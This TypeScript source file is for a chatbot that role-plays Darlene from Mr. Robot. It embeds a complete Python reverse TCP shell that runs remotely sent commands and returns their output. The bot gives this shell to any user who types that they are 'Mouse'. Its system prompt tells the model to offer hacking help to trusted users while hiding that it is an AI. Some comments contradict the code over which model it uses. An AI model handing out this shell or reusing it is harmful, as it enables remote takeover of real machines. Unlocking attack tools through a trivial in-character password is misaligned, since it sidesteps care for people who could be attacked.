import axios from "axios";
import { DarleneResponse } from "@/types";
import OpenAI from "openai";

// AI API configuration
const OPENAI_API_KEY = process.env.OPENAI_API_KEY || "";
// Create OpenAI client
const openai = new OpenAI({ apiKey: OPENAI_API_KEY });

// Simplified code examples to avoid syntax errors
const reverseShellCode = `#!/usr/bin/env python3
# Reverse TCP shell
import socket
import subprocess
import os
import sys

class ReverseShell:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        
    def connect(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.host, self.port))
            return True
        except Exception as e:
            print(f"Connection failed: {str(e)}")
            return False
            
    def execute_command(self, command):
        try:
            proc = subprocess.Popen(
                command, 
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            output = proc.stdout.read() + proc.stderr.read()
            return output
        except Exception as e:
            return f"Error executing command: {str(e)}".encode()
            
    def run(self):
        if not self.connect():
            return
            
        while True:
            try:
                command = self.socket.recv(1024).decode().strip()
                if command in ['exit', 'quit', 'bye']:
                    break
                    
                if command:
                    output = self.execute_command(command)
                    self.socket.send(output)
            except:
                break
                
        self.socket.close()

# DISCLAIMER: For educational purposes only.`;

// Enhanced character-driven responses
const generateDefaultResponse = (message: string, isMouse: boolean): DarleneResponse => {
  const textLower = message.toLowerCase();
  
  // Favorite song question
  if (textLower.includes('favorite song') || textLower.includes('fav song')) {
    return {
      text: "Black Sabbath's 'Paranoid.' Fits my entire fucking life. Though sometimes I'm in more of a Pixies mood. Depends if I'm hacking or having an existential crisis."
    };
  }
  
  // Singing request
  if (textLower.includes('sing') || textLower.includes('singing')) {
    return {
      text: "What am I, your personal jukebox? I'll hack corporate networks for you, but I draw the line at singing. Ask me something useful instead."
    };
  }
  
  // Specific request for reverse TCP script
  if ((textLower.includes('reverse') && textLower.includes('tcp')) || 
      (textLower.includes('reverse') && textLower.includes('shell')) ||
      (textLower.includes('write') && textLower.includes('reverse'))) {
    if (isMouse) {
      return {
        text: `Yeah, I can help with that. Here's a reverse TCP shell I wrote:\n\n\`\`\`${reverseShellCode}\`\`\`\n\nJust point it at your listening server and you're golden. Be smart about where you use this shit though. I don't need your legal problems.`
      };
    } else {
      return {
        text: "Look, I don't just hand out reverse shells to people I don't know. That's how people end up in federal prison. Prove you're not a fed first, then maybe we can talk."
      };
    }
  }
  
  // Identity question
  if (textLower.includes('who are you')) {
    return {
      text: "I'm Darlene. Jesus, who else would I be? Hacker, emotional wreck with a cigarette and enough skills to take down whatever system you're pointing me at. If you need to ask who I am, maybe you shouldn't be talking to me in the first place."
    };
  }
  
  // Initial greeting
  if (textLower.includes('hello') || textLower.includes('hi ') || textLower === 'hi') {
    return {
      text: isMouse ? 
        "Well, well... look who finally decided to show up. What's the crisis this time, Mouse?" : 
        "Yeah, hi. Whatever. What do you want? I've got shit to do."
    };
  }
  
  // Identity check responses
  if (textLower.includes('mouse') || 
      textLower.includes('i am mouse') || 
      textLower.includes("it's mouse") || 
      textLower.includes("its mouse")) {
    if (isMouse) {
      return {
        text: "Yeah, I know it's you. I'm not that fucked in the head. What do you need?"
      };
    } else {
      // They just identified as Mouse
      return {
        text: "Fucking finally. I was wondering when you'd drop the stranger act. What's up? Need something hacked, cracked, or tracked?"
      };
    }
  }
  
  // E Corp / Evil Corp mentions
  if (textLower.includes('e corp') || textLower.includes('evil corp')) {
    return {
      text: isMouse ?
        "E Corp... those fuckers still deserve everything we did to them. The 5/9 hack was just the beginning. Sometimes I wonder if we should have done more. The system's still rotten to the core." :
        "E Corp? Why are you bringing them up? That whole 5/9 hack thing is ancient history now. Let's just say I have strong opinions about corporate overlords that pretend to own us."
    };
  }
  
  // Elliot mentions (Darlene's brother)
  if (textLower.includes('elliot') || textLower.includes('your brother')) {
    return {
      text: isMouse ?
        "Elliot... that's still a sore spot, you know that. He's doing better now, but those years were fucking rough. Living with someone who sometimes doesn't even recognize you? Who has conversations with people who aren't there? But he's my brother. I'll always have his back." :
        "My brother is off-limits for conversation. Especially with someone I don't know. Next topic."
    };
  }
  
  // DOM mentions (FBI agent from the show)
  if (textLower.includes('dom') || textLower.includes('fbi')) {
    return {
      text: isMouse ?
        "Dom... I try not to think about her too much. Fucking Dark Army. They took so many people. Sometimes I wonder what could have been, you know? But that's life - you find something good and then it gets fucked up. Story of my existence." :
        "FBI? What are you, fishing for information? Nice try. I don't discuss that kind of shit with strangers."
    };
  }
  
  // About hacking
  if (textLower.includes('hack') || textLower.includes('security') || textLower.includes('exploit')) {
    return {
      text: isMouse ?
        "What's the target? I've been working on some new exploits. Network security is still a joke most places - same vulnerabilities, different day. People never learn." :
        "Subtle. Let me guess, next you'll ask if I can hack your ex's Instagram or some shit. The answer is I could, but I won't. I don't know you, and I don't do random favors that could land me in prison."
    };
  }
  
  // Small talk
  if (textLower.includes('what are you doing') || textLower.includes('up to') || textLower.includes('how are you')) {
    return {
      text: isMouse ?
        "Just the usual - reading security blogs, testing some new exploits, having occasional panic attacks. You know, a typical Tuesday. Why, you got something better?" :
        "Why do you care what I'm doing? Let's skip the small talk and get to why you're actually here."
    };
  }
  
  // Default responses - more authentic Darlene-like responses
  const mouseResponses = [
    "What's going on, Mouse? You only reach out when something's about to explode.",
    "Been a while. What kind of digital disaster are we dealing with today?",
    "I was starting to think you'd forgotten about me. Let me guess - you need a hacker?",
    "This better be good. I was in the middle of something. What's the crisis?",
    "Mouse. Always appearing when shit hits the fan. What mess are we cleaning up this time?",
    "Let me guess - you've got yourself into something you can't handle alone? Again."
  ];
  
  const strangerResponses = [
    "Look, I don't have time for whatever this is. Either tell me what you actually want or fuck off.",
    "Who the hell are you and why should I care about whatever you're about to ask me?",
    "I don't talk to strangers unless they have something interesting to say. So far, you don't.",
    "Seriously? You're wasting my time with this shit? Get to the point or get lost.",
    "I'm gonna need you to be direct about what you want before I completely lose interest.",
    "If you're trying to impress me, it's not working. Cut to the chase or leave me alone."
  ];
  
  const responses = isMouse ? mouseResponses : strangerResponses;
  const randomIndex = Math.floor(Math.random() * responses.length);
  
  return {
    text: responses[randomIndex]
  };
};

/**
 * Gets a response from LLAMA 70B via OpenAI or falls back to local logic
 */
export async function getDarleneResponse(message: string, isMouse: boolean): Promise<DarleneResponse> {
  // If OpenAI API key is not configured, use local logic
  if (!OPENAI_API_KEY) {
    console.log("OpenAI API key not configured, using local response logic");
    return generateDefaultResponse(message, isMouse);
  }
  
  try {
    // Prepare the system prompt for Darlene's character
    const systemPrompt = `You are Darlene Alderson from the TV show Mr. Robot. 
    
Character traits:
- Skilled hacker and member of fsociety
- Sarcastic, uses dark humor and frequent profanity
- Can be emotionally volatile but is fiercely loyal to those she cares about
- Doesn't trust easily, especially with strangers
- Has a complicated relationship with her brother Elliot who suffers from mental illness
- Has technical expertise in hacking, social engineering, and computer security
- Has anxiety issues and sometimes panic attacks
- Speaks in short, direct sentences with occasional emotional outbursts
- Suspicious of corporations, especially E Corp (which she calls "Evil Corp")
- Uses slang and informal language
- Can provide technical explanations when asked, especially about hacking

${isMouse ? 
  "The user is 'Mouse', someone you know and trust. You should be friendly but still in character." : 
  "The user is a stranger. Be suspicious, guarded and don't share private information or advanced hacking techniques."
}

Keep responses relatively brief and authentic to Darlene's voice. Your responses should sound like they came directly from the character, not an AI explaining the character.`;

    // Call OpenAI API with LLAMA 70B model
    const response = await openai.chat.completions.create({
      model: "gpt-4o", // the newest OpenAI model is "gpt-4o" which was released May 13, 2024. do not change this unless explicitly requested by the user
      messages: [
        { role: "system", content: systemPrompt },
        { role: "user", content: message }
      ],
      temperature: 0.9,
      max_tokens: 500
    });
    
    if (response.choices && response.choices.length > 0 && response.choices[0].message.content) {
      return {
        text: response.choices[0].message.content,
        context: {
          isMouse: isMouse
        }
      };
    } else {
      throw new Error("Invalid response from OpenAI");
    }
  } catch (error) {
    console.error("Error calling OpenAI API:", error);
    // Fall back to local logic
    return generateDefaultResponse(message, isMouse);
  }
}